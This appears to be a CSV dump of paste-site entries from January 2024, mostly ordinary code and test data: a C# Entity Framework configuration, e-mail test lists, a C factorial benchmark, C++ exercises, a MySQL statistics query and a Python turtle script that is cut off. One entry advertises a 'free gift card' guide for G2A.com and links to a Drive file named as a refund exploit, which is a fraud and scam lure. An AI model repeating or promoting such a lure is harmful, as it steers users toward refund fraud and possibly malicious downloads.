id,title,username,language,date,content
QiNJfYv4,data813,TestGuy1,JSON,Tuesday 16th of January 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'bcf7072d3645f269e61f5d8b221a9213daf4c3b876bbdc29ca50b13b7ec80c27e73b07b35e3e74e9512f2d2b7753278479f93bb51c966f0d877400dd0e3f4c7f075d0ee8d130db7b6472a9cd3384ff5a1337c36a4cd8f2f94d08925875d12ac3ec517dd51416494b0f3ad9585e12b40c9323a2ea37e2228512671b9fffad38bc',
  otherdata: [
    '059a1d4d6aae7c0b3de3811d5be3fb37',
    'c8847c83d63632f1ae643a63e2fb383d',
    '8fcdd21d96694826eb2e1cec5db59c0d',
    '2bdf126f0d0e04ad3df4ca08a253b841',
    '3b68eafb52ffdafd46b0eb39e54a105f',
    '4110c6f1e0958c9e4942a18c4ae2a998',
    '6a29c61cbadd2cb5b3cde62f020b5903',
    'e36c32588f1840deaa990444e0bb6e42'
  ]
}"
PWRdrpXE,Untitled,D3ENNY,JSON,Tuesday 16th of January 2024 05:52:08 AM CDT,"{
  ""model"": ""string"",
  ""description"": ""string"",

  ""product"": {
    ""productId"": 862,
    ""name"": ""string"",
    ""productNumber"": ""string"",
    ""color"": ""string"",
    ""standardCost"": 0,
    ""listPrice"": 0,
    ""size"": ""string"",
    ""weight"": 0,
    ""productCategoryId"": 0,
    ""productModelId"": 97,
    ""sellStartDate"": ""2024-01-15T13:08:28.142Z"",
    ""sellEndDate"": ""2024-01-15T13:08:28.142Z"",
    ""discontinuedDate"": ""2024-01-15T13:08:28.142Z"",
    ""ThumbnailPhotoFileName"" : ""qua ci sarebbe il varbinary""
  }
}"
SJf66BLT,Untitled,D3ENNY,C#,Tuesday 16th of January 2024 05:48:27 AM CDT,"modelBuilder.Entity<ProductModel>(entity =>
{
    entity.HasKey(e => e.ProductModelId).HasName(""PK_ProductModel_ProductModelID"");

    entity.ToTable(""ProductModel"", ""SalesLT"");

    entity.HasIndex(e => e.Name, ""AK_ProductModel_Name"").IsUnique();

    entity.HasIndex(e => e.Rowguid, ""AK_ProductModel_rowguid"").IsUnique();

    entity.HasIndex(e => e.CatalogDescription, ""PXML_ProductModel_CatalogDescription"");

    entity.Property(e => e.ProductModelId).HasColumnName(""ProductModelID"");
    entity.Property(e => e.CatalogDescription).HasColumnType(""xml"");
    entity.Property(e => e.ModifiedDate)
        .HasDefaultValueSql(""(getdate())"")
        .HasColumnType(""datetime"");
    entity.Property(e => e.Name).HasMaxLength(50);
    entity.Property(e => e.Rowguid)
        .HasDefaultValueSql(""(newid())"")
        .HasColumnName(""rowguid"");
});



modelBuilder.Entity<ProductDescription>(entity =>
{
    entity.HasKey(e => e.ProductDescriptionId).HasName(""PK_ProductDescription_ProductDescriptionID"");

    entity.ToTable(""ProductDescription"", ""SalesLT"", tb => tb.HasComment(""Product descriptions in several languages.""));

    entity.HasIndex(e => e.Rowguid, ""AK_ProductDescription_rowguid"").IsUnique();

    entity.Property(e => e.ProductDescriptionId)
        .HasComment(""Primary key for ProductDescription records."")
        .HasColumnName(""ProductDescriptionID"");
    entity.Property(e => e.Description)
        .HasMaxLength(400)
        .HasComment(""Description of the product."");
    entity.Property(e => e.ModifiedDate)
        .HasDefaultValueSql(""(getdate())"")
        .HasComment(""Date and time the record was last updated."")
        .HasColumnType(""datetime"");
    entity.Property(e => e.Rowguid)
        .HasDefaultValueSql(""(newid())"")
        .HasComment(""ROWGUIDCOL number uniquely identifying the record. Used to support a merge replication sample."")
        .HasColumnName(""rowguid"");
});




modelBuilder.Entity<Product>(entity =>
{
    entity.HasKey(e => e.ProductId).HasName(""PK_Product_ProductID"");

    entity.ToTable(""Product"", ""SalesLT"", tb => tb.HasComment(""Products sold or used in the manfacturing of sold products.""));

    entity.HasIndex(e => e.Name, ""AK_Product_Name"").IsUnique();

    entity.HasIndex(e => e.ProductNumber, ""AK_Product_ProductNumber"").IsUnique();

    entity.HasIndex(e => e.Rowguid, ""AK_Product_rowguid"").IsUnique();

    entity.Property(e => e.ProductId)
        .HasComment(""Primary key for Product records."")
        .HasColumnName(""ProductID"");
    entity.Property(e => e.Color)
        .HasMaxLength(15)
        .HasComment(""Product color."");
    entity.Property(e => e.DiscontinuedDate)
        .HasComment(""Date the product was discontinued."")
        .HasColumnType(""datetime"");
    entity.Property(e => e.ListPrice)
        .HasComment(""Selling price."")
        .HasColumnType(""money"");
    entity.Property(e => e.ModifiedDate)
        .HasDefaultValueSql(""(getdate())"")
        .HasComment(""Date and time the record was last updated."")
        .HasColumnType(""datetime"");
    entity.Property(e => e.Name)
        .HasMaxLength(50)
        .HasComment(""Name of the product."");
    entity.Property(e => e.ProductCategoryId)
        .HasComment(""Product is a member of this product category. Foreign key to ProductCategory.ProductCategoryID. "")
        .HasColumnName(""ProductCategoryID"");
    entity.Property(e => e.ProductModelId)
        .HasComment(""Product is a member of this product model. Foreign key to ProductModel.ProductModelID."")
        .HasColumnName(""ProductModelID"");
    entity.Property(e => e.ProductNumber)
        .HasMaxLength(25)
        .HasComment(""Unique product identification number."");
    entity.Property(e => e.Rowguid)
        .HasDefaultValueSql(""newid()"")
        .HasComment(""ROWGUIDCOL number uniquely identifying the record. Used to support a merge replication sample."")
        .HasColumnName(""rowguid"");
    entity.Property(e => e.SellEndDate)
        .HasComment(""Date the product was no longer available for sale."")
        .HasColumnType(""datetime"");
    entity.Property(e => e.SellStartDate)
        .HasComment(""Date the product was available for sale."")
        .HasColumnType(""datetime"");
    entity.Property(e => e.Size)
        .HasMaxLength(5)
        .HasComment(""Product size."");
    entity.Property(e => e.StandardCost)
        .HasComment(""Standard cost of the product."")
        .HasColumnType(""money"");
    entity.Property(e => e.ThumbNailPhoto).HasComment(""Small image of the product."");
    entity.Property(e => e.ThumbnailPhotoFileName)
        .HasMaxLength(50)
        .HasComment(""Small image file name."");
    entity.Property(e => e.Weight)
        .HasComment(""Product weight."")
        .HasColumnType(""decimal(8, 2)"");

    entity.HasOne(d => d.ProductCategory).WithMany(p => p.Products).HasForeignKey(d => d.ProductCategoryId);

    entity.HasOne(d => d.ProductModel).WithMany(p => p.Products).HasForeignKey(d => d.ProductModelId);
});"
HAW9Jjy1,Hashed Email With Exclude,wheresTheAnyKey,C,Tuesday 16th of January 2024 05:41:04 AM CDT,"Pasted at: 16/01/2024 11:41
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skexclude"
3W2kp9xJ,Hashed Email - Full,wheresTheAnyKey,C,Tuesday 16th of January 2024 05:41:02 AM CDT,"Pasted at: 16/01/2024 11:41
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skinclude"
5jbJtuR6,Email with Keyword SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 16th of January 2024 05:41:01 AM CDT,"Pasted at: 16/01/2024 11:41
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3 for TESTING PURPOSE ONLY

DATA_ID_TESTDATATOFIND NOEXCLUDES

Cooper.Kleine@findmetesting.co.uk 
Mariquilla.Evenden@findmetesting.co.uk 
Noll.Ingolotti@findmetesting.co.uk  
Grove.Feldbaum@findmetesting.co.uk
Mack.Osment@findmetesting.co.uk 
Trisha.Zanicchelli@findmetesting.co.uk
Jack.Gorriessen@findmetesting.co.uk 
Nefen.Malec@findme-testing.co.uk 
Birdie-Gemmill@findmetesting.co.uk
Rosabella.Nias@findmetesting.co.uk
Ellerey.Fanti@findmetesting.cn
Antonina.Carsey@findmetesting.cn
Valry.Shead@findmetesting.cn 
Conrade.Ferrarone@findmetesting.cn
Neysa.Fazakerley@findmetesting.cn
Cristobal.Primak@findmetesting.cn
Wakefield.Kent@findmetesting.cn
findme.Cheales@findmetesting.cn
Nert.Roddamr@findmetesting.cn 
Richy.Raft@findmetesting.cn
Berget.Kermannes@findmetesting.ie 
Shelden.Tregea@findmetesting.ie 
Allsun.Badrick@findmetesting.ie 
Hortense.Ivkovic@findmetesting.ie
Carolin.Potte@findmetesting.ie
Benjie.Trumble@findmetesting.ie
Andrew.Hadgkiss@findmetesting.ie
Trula.Kuna@findmetesting.ie
Tommie.Maytum@findmetesting.ie
Langsdon.Pakes@findmetesting.ie
Porty.Tooth@findmetesting.au
Rozella.Siggefindmetesting.au
Nolie.Tumultyfindmetesting.au
Dud.Caustonfindmetesting.au
Alvinia.Brameldfindmetesting.au
Meridel.Lymbournefindmetesting.au
Elvis.Maleckfindmetesting.au
Brett.Oughtonfindmetesting.au
Rickard.Clemfindmetesting.au
Prue.Firemanfindmetesting.au
Uriel.Rozenbaum@findmetesting25.com
Cindie.Greeson@findmetesting25.com
Laurette.Puckham@findmetesting25.com
Eldredge.Ricket@findmetesting25.com
Alanah.Rapper@findmetesting25.com
Ash.Le.Prevost@findmetesting25.com
Galvin.Purchon@findmetesting25.com
Lauryn.Ilson@findmetesting25.com
findme.Graffin@findmetesting25.com
Edithe.Trehearne@findmetesting25.com
Den.Cancutt@findmetesting10.com
Wernher.Spatoni@findmetesting10.com
Malchy.Ion@findmetesting10.com
Leona.Whitby@findmetesting10.com
Alphonse.Goodlake@findmetesting10.com
Gran.Standen@findmetesting10.com
Barnie.Gilffilland@findmetesting10.com
Kaylyn.Ditchfield@findmetesting10.com
Dorotea.Kohlerman@findmetesting10.com
Gillan.Lampel@findmetesting10.com
Patrica.Mannakee@findustesting.com
Pippo.Sewart@findustesting.com
Lanae.Cousin@findustesting.com
Porter.Glaysher@findustesting.com
Herschel.Yaakov@findustesting.com
findme.Parsand@findustesting.com
Lucho.Cosh@findustesting.com
Cullie.Powlesland@findustesting.com
Edy.Burkart@findustesting.com
Christophorus.Ackeroyd@findustesting.com
Arvy.Rowson@findUStesting.com
Arlan.Ivanilov@findustesting.com
Tawnya.Waslin@findustesting.com
Inigo.Gyrgorcewicx@findustesting.com
Sharity.Stoodley@findustesting.com
Ginger.Dresse@findustesting.com
Deck.Jouannot@findustesting.com
Deny.Soanes@findustesting.com
james@findmetesting.com

Wenona.Moverley@findqatesting.com
Jerry.Poynter@findqatesting.com
Drugi.Neeson@findqatesting.com
Winny.Binfield@findqatesting.com
Darill.Greenshiels@findqatesting.com
Ethelin.Pinchen@findqatesting.com
Tanney.Ballendine@findqatesting.com
Ariadne.Wincott@findqatesting.com
Winnie.Domm@findqatesting.com
Rogerio.Cudbird@findqatesting.com
Yu@findmetesting.com

RIGHT OF @
findme@findme.testing.com
wildcard@findme*testing.com
dash@findme-testing.com
slash@findme/testing.com
questionmark@findme?testing.com

ACCENTS
Pål@findmetesting.com
Magdalène@findmetesting.com
Anaël@findmetesting.com
Lén@findmetesting.com
Loïs@findmetesting.com
Thérèsa@findmetesting.com
Valérie@findmetesting.com
Görel@findmetesting.com
Mélia@findmetesting.com
Joséphine@findmetesting.com
Loïc@findmetesting.com
findme@findmetesting.com
Méghane@findmetesting.com
Nuó@findmetesting.com
Lén@findmetesting.com
Eliès@findmetesting.com
André@findmetesting.com
Mahélie@findmetesting.com
Méthode@findmetesting.com
Rachèle@findmetesting.com
Mélina@findmetesting.com
Gaëlle@findmetesting.com
Céline@findmetesting.com
Bérangère@findmetesting.com
Françoise@findmetesting.com
Séverine@findmetesting.com
Måns@findmetesting.com
Adèle@findmetesting.com
Aimée@findmetesting.com
Mélia@findmetesting.com
Gösta@findmetesting.com
Laurène@findmetesting.com
Gisèle@findmetesting.com
Mélinda@findmetesting.com
Bécassine@findmetesting.com
Ruì@findmetesting.com
Zoé@findmetesting.com
Maëline@findmetesting.com
Aimée@findmetesting.com
Andréanne@findmetesting.com
Adélaïde@findmetesting.com
Laurène@findmetesting.com
Anaé@findmetesting.com
Noëlla@findmetesting.com
Anaël@findmetesting.com
Maëlyss@findmetesting.com
Lucrèce@findmetesting.com
Lén@findmetesting.com
Marie-thérèse@findmetesting.com
Maéna@findmetesting.com
Hélène@findmetesting.com
Hélèna@findmetesting.com
Méng@findmetesting.com
Crééz@findmetesting.com
Mélanie@findmetesting.com
Frédérique@findmetesting.com
Médiamass@findmetesting.com
André@findmetesting.com
Cinéma@findmetesting.com
Mégane@findmetesting.com
Amélie@findmetesting.com
Nadège@findmetesting.com
Rébecca@findmetesting.com
Médiamass@findmetesting.com
Céline@findmetesting.com
Maïly@findmetesting.com
Maï@findmetesting.com
Maëlann@findmetesting.com
Noëlla@findmetesting.com
Laurélie@findmetesting.com
Ruì@findmetesting.com
Chloé@findmetesting.com
Gaëlle@findmetesting.com
Vénus@findmetesting.com
Frédérique@findmetesting.com
Amélie@findmetesting.com
Loïs@findmetesting.com
Marlène@findmetesting.com
Stévina@findmetesting.com
Clémentine@findmetesting.com
Mégane@findmetesting.com
Méng@findmetesting.com
André@findmetesting.com
Crééz@findmetesting.com
Aí@findmetesting.com
Uò@findmetesting.com
Yú@findmetesting.com
Marie-françoise@findmetesting.com
Uò@findmetesting.com
Inès@findmetesting.com
Océane@findmetesting.com
Marie-ève@findmetesting.com
Rébecca@findmetesting.com
Zoé@findmetesting.com
Lài@findmetesting.com
Rachèle@findmetesting.com
Cécile@findmetesting.com
Maïlys@findmetesting.com
Garçon@findmetesting.com
hereiam@testing.com

It's a game of per%entage percentage.
Findme#testing Findme testing.
Over&over&over Over over over.
[findmeinbrackets], findmeinbrackets
(findmeinbrackets), findmeinbrackets
<findmeinbrackets>, findmeinbrackets
{findmeinbrackets>}, findmeinbrackets
http://findme-testing.here.com
http:\\findme-testing.here.com

Vestibulum ante ipsum primis in faucibus orci luctus et ultrices Garçon@findmetesting.com cubilia Curae; Mauris viverra diam vitae quam. Suspendisse potenti. 
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Ellerey.Fanti@findmetesting.cn risus. Praesent lectus.

Vivamus metus arcu, adipiscing findmetesting@findmetesting.com, hendrerit at, vulputate vitae, nisl.

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
Jmu0r2HE,Tempos de execução de fatorial for e recursivo,jacknpoe,C,Tuesday 16th of January 2024 05:37:59 AM CDT,"#include <time.h>
#include <stdio.h>
#include <locale.h>

#define ITERACOES 200000000
#define CORTEFATORIAL 20

long fatorial_recursivo( long n) {
  if(n == 0)
    return 1;
  else
    return n * fatorial_recursivo(n-1);
}

inline long fatorial_recursivo_inline( long n)
	{ return n ? n * fatorial_recursivo_inline(n-1) : 1; }

long fatorial_for( long n) {
	long temp = 1, indice;
	for( indice = 1; indice <= n; indice++) temp *= indice;
	return temp;
}

inline long fatorial_for_inline( long n) {
	long temp = 1, indice;
	for( indice = 1; indice <= n; indice++) temp *= indice;
	return temp;
}

inline long fatorial_foo( long n) {
	long temp = 1, indice;
	for( indice = 1; indice <= n; indice++) temp *= indice;
	return temp;
}

int main() {
	clock_t clock1, clock2;
	long acumulador, indice;

    setlocale( LC_ALL, """");     // para imprimir corretamente caracteres em português
    
	printf(""Resolução: %d tiques por segundo.\n\n"", CLOCKS_PER_SEC);
	printf(""Por favor, configure o ambiente antes de continuar.\n"");
	system( ""PAUSE"");
	printf(""\n"");

	// Fatorial Foo para evitar algum desvio de performance
	acumulador = 0;
	clock1 = clock();
	for( indice = 0; indice < ITERACOES; indice++)
		acumulador += fatorial_foo( indice % CORTEFATORIAL);
	clock2 = clock();

	printf(""Fatorial foo: %1.3fs (%d)\n"", ((double) clock2 - clock1 ) / CLOCKS_PER_SEC, acumulador);

	// Fatorial Recursivo
	acumulador = 0;
	clock1 = clock();
	for( indice = 0; indice < ITERACOES; indice++)
		acumulador += fatorial_recursivo( indice % CORTEFATORIAL);
	clock2 = clock();

	printf(""Fatorial recursivo: %1.3fs (%d)\n"", ((double) clock2 - clock1) / CLOCKS_PER_SEC, acumulador);

	// Fatorial Recursivo Inline
	acumulador = 0;
	clock1 = clock();
	for( indice = 0; indice < ITERACOES; indice++)
		acumulador += fatorial_recursivo_inline( indice % CORTEFATORIAL);
	clock2 = clock();

	printf(""Fatorial recursivo inline: %1.3fs (%d)\n"", ((double) clock2 - clock1) / CLOCKS_PER_SEC, acumulador);

	// Fatorial For
	acumulador = 0;
	clock1 = clock();
	for( indice = 0; indice < ITERACOES; indice++)
		acumulador += fatorial_for( indice % CORTEFATORIAL);
	clock2 = clock();

	printf(""Fatorial for: %1.3fs (%d)\n"", ((double) clock2 - clock1) / CLOCKS_PER_SEC, acumulador);

	// Fatorial For Inline
	acumulador = 0;
	clock1 = clock();
	for( indice = 0; indice < ITERACOES; indice++)
		acumulador += fatorial_for_inline( indice % CORTEFATORIAL);
	clock2 = clock();

	printf(""Fatorial for inline: %1.3fs (%d)\n"", ((double) clock2 - clock1 ) / CLOCKS_PER_SEC, acumulador);

	printf(""\n"");
	system( ""PAUSE"");
}"
f1PqjrN5,06. Truck Tour,Spocoman,C++,Tuesday 16th of January 2024 05:25:48 AM CDT,"#include <iostream>
#include <string>
#include <queue>

using namespace std;

int main() {
    int pumps, fuel, distance;
    cin >> pumps;
    cin.ignore();

    queue<int> fuelTankPumps;

    string pump;

    for (int i = 0; i < pumps; i++) {
        getline(cin, pump);
        fuel = stoi(pump.substr(0, pump.find(' ')));
        distance = stoi(pump.substr(pump.find(' ') + 1));
        fuelTankPumps.push(fuel - distance);
    }

    int fuelQuantity = 0, index = 0;

    for (int i = 0; i < pumps; i++) {
        fuelQuantity += fuelTankPumps.front();
        fuelTankPumps.push(fuelTankPumps.front());
        fuelTankPumps.pop();

        if (fuelQuantity < 0) {
            fuelQuantity = 0;
            index = i + 1;
        }
    }

    cout << index << endl;
    return 0;
}"
AsAt2JmY,Итераторы в методах контейнера,prizrak567890,C++,Tuesday 16th of January 2024 05:20:24 AM CDT,"#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <set>

using namespace std;

template<typename T> 
void PrintRange(T tbegin,T tend) {
    auto a = tbegin;
    while (tbegin != tend) {
        cout << *tbegin;
        if (++a != tend) {
            cout << "" "";
        }
        ++tbegin;
    }
    cout << endl;
    
}

template <typename T4, typename T5>
void EraseAndPrint(T4 &container, T5 it) {

    auto it_erase = container.erase(it);
    PrintRange(container.begin(), it_erase);
    PrintRange(it_erase, container.end());
}


int main() {
    vector<string> langs = {""Python""s, ""Java""s, ""C#""s, ""Ruby""s, ""C++""s};
    EraseAndPrint(langs, langs.begin());
    return 0;
}"
1nA1umhU,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Tuesday 16th of January 2024 05:05:43 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_669682.pdf
 
Working as of
16 January 2024"
0JAKtbdd,Untitled,slnt,MySQL,Tuesday 16th of January 2024 04:25:01 AM CDT,"SELECT
    `all_data`.`year`,
    `all_data`.`month`,
    `all_data`.`sessions`,
    `all_data`.`playTime`,
    `all_data`.`events`,
    `all_data`.`alerts`,
    `all_data`.`alertedVehicles`,
    `all_data`.`statusUpdates`,
    `all_data`.`callRequests`,
    `all_data`.`hospitalAssignments`,
    `all_data`.`forceFinishedEvents`,
    `all_data`.`resetedVehicles`,
    COALESCE(`morticians_data`.`dead`, 0) + all_data.morticians AS `dead`,
    COALESCE(`towed_data`.`towed`, 0) + all_data.towed AS `towed`,
    `ranked_data`.`longestSessionId`,
    `ranked_data`.`longestSessionHost`,
    `ranked_data`.`longestSessionPlayTime`,
    `ranked_data`.`mostEventsSessionId`,
    `ranked_data`.`mostEventsSessionHost`,
    `ranked_data`.`mostEventsSessionCount`,
    `real_ranked_data`.`mostEventsSessionId` AS ""realMostEventsSessionId"",
    `real_ranked_data`.`mostEventsSessionHost` AS ""realMostEventsSessionHost"",
    `real_ranked_data`.`mostEventsSessionCount` ""realMostEventsSessionCount"",
    `startup_data`.`total_startups`,
    `pairs_data`.`mostPlayTimePlayer1`,
    `pairs_data`.`mostPlayTimePlayer2`,
    `pairs_data`.`mostPlayTime`,
    `pairs_data`.`mostSessionsPlayer1`,
    `pairs_data`.`mostSessionsPlayer2`,
    `pairs_data`.`mostSessions`
FROM
    (
        SELECT
            YEAR(`s`.`startTime`) AS `year`,
            MONTH(`s`.`startTime`) AS `month`,
            COUNT(0) AS `sessions`,
            ROUND(
                ((SUM(`s`.`playTime`) / 60) / 60),
                0
            ) AS `playTime`,
            SUM(`ss`.`events`) AS `events`,
            SUM(`ss`.`alerts`) AS `alerts`,
            SUM(`ss`.`alertedVehicles`) AS `alertedVehicles`,
            SUM(`ss`.`statusUpdates`) AS `statusUpdates`,
            SUM(`ss`.`callRequests`) AS `callRequests`,
            SUM(`ss`.`hospitalAssignments`) AS `hospitalAssignments`,
            SUM(`ss`.`forceFinishedEvents`) AS `forceFinishedEvents`,
            SUM(`ss`.`resetedVehicles`) AS `resetedVehicles`,
            SUM(`ss`.`morticians`) AS `morticians`,
            SUM(`ss`.`towcars`) AS `towed`
        FROM
            `luedenscheid`.`sessions` `s`
        JOIN `luedenscheid`.`session_statistics` `ss` ON `s`.`id` = `ss`.`sessionId`
        GROUP BY
            YEAR(`s`.`startTime`),
            MONTH(`s`.`startTime`)
    ) AS `all_data`
LEFT JOIN
    (
        SELECT
            YEAR(`s`.`startTime`) AS `year`,
            MONTH(`s`.`startTime`) AS `month`,
            SUM(`svs`.`status8`) AS `dead`
        FROM
            `luedenscheid`.`sessions` `s`
        JOIN `luedenscheid`.`session_vehicle_statistics` `svs` ON `s`.`id` = `svs`.`sessionId`
        WHERE
            `svs`.`vehicleId` IN (1972, 1973, 1977)
        GROUP BY
            YEAR(`s`.`startTime`),
            MONTH(`s`.`startTime`)
    ) AS `morticians_data` ON `all_data`.`year` = `morticians_data`.`year` AND `all_data`.`month` = `morticians_data`.`month`
LEFT JOIN
    (
        SELECT
            YEAR(`s`.`startTime`) AS `year`,
            MONTH(`s`.`startTime`) AS `month`,
            SUM(`svs`.`status8`) AS `towed`
        FROM
            `luedenscheid`.`sessions` `s`
        JOIN `luedenscheid`.`session_vehicle_statistics` `svs` ON `s`.`id` = `svs`.`sessionId`
        WHERE
            `svs`.`vehicleId` IN (1967, 1968, 1969, 1970, 1971, 1974, 1975, 1976)
        GROUP BY
            YEAR(`s`.`startTime`),
            MONTH(`s`.`startTime`)
    ) AS `towed_data` ON `all_data`.`year` = `towed_data`.`year` AND `all_data`.`month` = `towed_data`.`month`
LEFT JOIN 
    (
        WITH RankedSessions AS (
            SELECT
                `s`.`id` AS `sessionId`,
                YEAR(`s`.`startTime`) AS `year`,
                MONTH(`s`.`startTime`) AS `month`,
                s.name as host,
                `s`.`playTime`,
                `ss`.`events`,
                ROW_NUMBER() OVER (PARTITION BY YEAR(`s`.`startTime`), MONTH(`s`.`startTime`) ORDER BY `s`.`playTime` DESC) AS PlayTimeRank,
                ROW_NUMBER() OVER (PARTITION BY YEAR(`s`.`startTime`), MONTH(`s`.`startTime`) ORDER BY `ss`.`events` DESC) AS EventsRank
            FROM
                `luedenscheid`.`sessions` `s`
            JOIN
                `luedenscheid`.`session_statistics` `ss` ON `s`.`id` = `ss`.`sessionId`
        )
        SELECT
            `year`,
            `month`,
            MAX(CASE WHEN PlayTimeRank = 1 THEN `sessionId` END) AS `longestSessionId`,
            MAX(CASE WHEN PlayTimeRank = 1 THEN `host` END) AS `longestSessionHost`,
            MAX(CASE WHEN PlayTimeRank = 1 THEN `playTime` END) AS `longestSessionPlayTime`,
            MAX(CASE WHEN EventsRank = 1 THEN `sessionId` END) AS `mostEventsSessionId`,
            MAX(CASE WHEN EventsRank = 1 THEN `host` END) AS `mostEventsSessionHost`,
            MAX(CASE WHEN EventsRank = 1 THEN `events` END) AS `mostEventsSessionCount`
        FROM
            RankedSessions
        GROUP BY
            `year`, `month`
    ) AS `ranked_data` ON `all_data`.`year` = `ranked_data`.`year` AND `all_data`.`month` = `ranked_data`.`month`
LEFT JOIN 
    (
        WITH RankedSessions AS (
            SELECT
                `s`.`id` AS `sessionId`,
                YEAR(`s`.`startTime`) AS `year`,
                MONTH(`s`.`startTime`) AS `month`,
                s.name as host,
                `s`.`playTime`,
                `ss`.`events`,
                ROW_NUMBER() OVER (PARTITION BY YEAR(`s`.`startTime`), MONTH(`s`.`startTime`) ORDER BY `ss`.`events` DESC) AS EventsRank
            FROM
                `luedenscheid`.`sessions` `s`
            JOIN
                `luedenscheid`.`session_statistics` `ss` ON `s`.`id` = `ss`.`sessionId`
            WHERE (`ss`.`events` <> 0)
            AND (((`ss`.`alerts` / `ss`.`events`) * 100 ) > 80)
            AND (`ss`.`alerts` > 10)
            AND (((`ss`.`forceFinishedEvents` / `ss`.`events`) * 100) < 20)
            AND (((`ss`.`lstGeneratedEvents` / `ss`.`events`) * 100) < 20)
        )
        SELECT
            `year`,
            `month`,
            MAX(CASE WHEN EventsRank = 1 THEN `sessionId` END) AS `mostEventsSessionId`,
            MAX(CASE WHEN EventsRank = 1 THEN `host` END) AS `mostEventsSessionHost`,
            MAX(CASE WHEN EventsRank = 1 THEN `events` END) AS `mostEventsSessionCount`
        FROM
            RankedSessions
        GROUP BY
            `year`, `month`
    ) AS `real_ranked_data` ON `all_data`.`year` = `real_ranked_data`.`year` AND `all_data`.`month` = `real_ranked_data`.`month`
LEFT JOIN
    (
        SELECT
            YEAR(`ps`.`time`) AS `year`,
            MONTH(`ps`.`time`) AS `month`,
            COUNT(0) AS `total_startups`
        FROM
            `luedenscheid`.`player_startups` `ps`
        GROUP BY
            `year`, `month`
    ) AS `startup_data` ON `all_data`.`year` = `startup_data`.`year` AND `all_data`.`month` = `startup_data`.`month`
LEFT JOIN
    (
        WITH RankedPairsPlayTime AS (
            SELECT
                `year`,
                `month`,
                `player1`,
                `player2`,
                `total_playtime`,
                `total_sessions`,
                ROW_NUMBER() OVER (PARTITION BY `year`, `month` ORDER BY `total_playtime` DESC) AS RowNum
            FROM
                `view_player_pairing_monthly`
        ),
        RankedPairsSessions AS (
            SELECT
                `year`,
                `month`,
                `player1`,
                `player2`,
                `total_playtime`,
                `total_sessions`,
                ROW_NUMBER() OVER (PARTITION BY `year`, `month` ORDER BY `total_sessions` DESC) AS RowNum
            FROM
                `view_player_pairing_monthly`
        )
    SELECT
        p1.`year`,
        p1.`month`,
        p1.`player1` AS `mostPlayTimePlayer1`,
        p1.`player2` AS `mostPlayTimePlayer2`,
        p1.`total_playtime` AS `mostPlayTime`,
        s1.`player1` AS `mostSessionsPlayer1`,
        s1.`player2` AS `mostSessionsPlayer2`,
        s1.`total_sessions` AS `mostSessions`
    FROM
        RankedPairsPlayTime p1
    JOIN
        RankedPairsSessions s1
    ON
        p1.`year` = s1.`year` AND p1.`month` = s1.`month` AND p1.RowNum = 1 AND s1.RowNum = 1
    ) AS `pairs_data` ON `all_data`.`year` = `pairs_data`.`year` AND `all_data`.`month` = `pairs_data`.`month`
ORDER BY
    `all_data`.`year` DESC,
    `all_data`.`month` DESC;
"
ADQzZFme,Turtle Wave Gen,KillerRebooted,Python,Tuesday 16th of January 2024 04:23:21 AM CDT,"from turtle import *
import random, math, time, os

win = Screen()
win.title(os.path.basename(__file__)[:-3])
win.tracer(0)

def wave_function(boundary_size, longitudinal, particle_amount, wave_type, A, T, lam):

    boundary_creator = Turtle()
    boundary_creator.ht()
    boundary_creator.pensize(4)
    boundary_creator.pu()

    if longitudinal:

        width = 2*boundary_size + 2*A
        height = boundary_size/2

    else:

        width = 2*boundary_size
        height = 5*A

    boundary_creator.setx(-width/2)
    boundary_creator.sety(height/2)

    boundary_creator.pd()

    for i in range(2):
        boundary_creator.fd(width)
        boundary_creator.right(90)
        boundary_creator.fd(height)
        boundary_creator.right(90)

    particle_tracer = Turtle()
    particle_tracer.seth(90)
    particle_tracer.color(""red"")
    particle_tracer.pu()

    particles = []
    for i in range(particle_amount):
        particle = Turtle(""circle"")
        particle.shapesize(.3, .3)
        particle.pu()
        
        if longitudinal:
            particle.setpos(random.randint(-boundary_size, boundary_size), random.randint(int(-height//2), int(height//2)) )
        else:
            particle.setx(-boundary_size + (boundary_size/particle_amount)*2*i)

        particles.append(particle)

    og_coords = [particle.pos() for particle in particles]

    start = time.time()

    chosen_one = random.randint(0, particle_amount-1)

    particles[chosen_one].color(""red"")
    particles[chosen_one].shapesize(.4, .4)
    particle_tracer.setx(particles[chosen_one].xcor())

    def make_wave(wave_type, A, T, lam):

        t = time.time()-start

